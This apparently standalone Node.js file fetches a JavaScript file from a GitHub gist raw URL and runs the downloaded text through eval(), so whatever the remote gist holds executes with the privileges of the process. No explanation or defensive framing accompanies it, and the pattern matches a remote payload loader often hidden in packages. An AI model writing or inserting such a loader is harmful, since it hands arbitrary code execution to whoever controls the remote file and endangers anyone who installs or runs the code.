const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/3017b40ee4c2ceebf6fc6dfdd651d86daba858fd/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
